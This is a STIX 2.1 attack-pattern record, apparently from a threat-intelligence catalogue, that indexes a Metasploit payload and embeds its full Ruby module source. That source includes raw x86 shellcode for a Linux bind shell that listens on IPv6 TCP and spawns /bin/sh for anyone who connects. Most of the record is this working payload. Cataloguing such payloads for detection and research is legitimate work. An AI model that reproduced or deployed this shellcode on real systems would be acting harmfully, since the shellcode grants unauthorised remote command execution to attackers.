{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89ead954-40c4-4a13-b2dc-ea12b62837a9",
    "created": "2024-08-14T16:33:19.434685Z",
    "modified": "2024-08-14T16:33:19.434688Z",
    "name": "Linux Command Shell, Bind TCP Inline (IPv6)",
    "description": "Listen for a connection over IPv6 and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x86/shell_bind_ipv6_tcp.rb",
            "external_id": "shell_bind_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 90\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Inline (IPv6)',\n      'Description'   => 'Listen for a connection over IPv6 and spawn a command shell',\n      'Author'        => 'kris katterjohn',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' => { 'LPORT' => [ 0x18, 'n' ], },\n          'Payload' =>\n            \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x96\" +\n            \"\\x99\\x52\\x52\\x52\\x52\\x52\\x52\\x66\\x68\\xbf\\xbf\\x66\\x68\\x0a\\x00\" +\n            \"\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\xb0\" +\n            \"\\x66\\xb3\\x04\\xcd\\x80\\x52\\x52\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\" +\n            \"\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\" +\n            \"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}